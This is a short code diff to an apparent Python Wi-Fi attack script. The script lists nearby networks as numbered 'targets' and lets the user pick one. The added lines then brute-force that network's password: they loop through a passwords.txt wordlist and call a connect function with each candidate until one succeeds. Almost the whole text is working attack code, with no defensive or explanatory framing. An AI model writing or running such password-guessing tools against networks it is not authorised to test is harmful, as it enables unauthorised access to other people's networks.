@@ -19,3 +19,10 @@ for cell in targetsList:
 	print("["+str(targetsList.index(cell))+"] "+cell['Address']+" | "+cell['ESSID']+" | Encryption key: "+cell['Encryption key']  +"\n")
 targetIndex=int(input(">>> "))
 target=targetsList[targetIndex]
+with open("passwords.txt") as infile:
+    for password in infile:
+    	print("Try: "+password+"\n")
+    	res=net_wrap.tryConnect(target['ESSID'], password, curInt)
+    	if res==True:
+    		break
+	
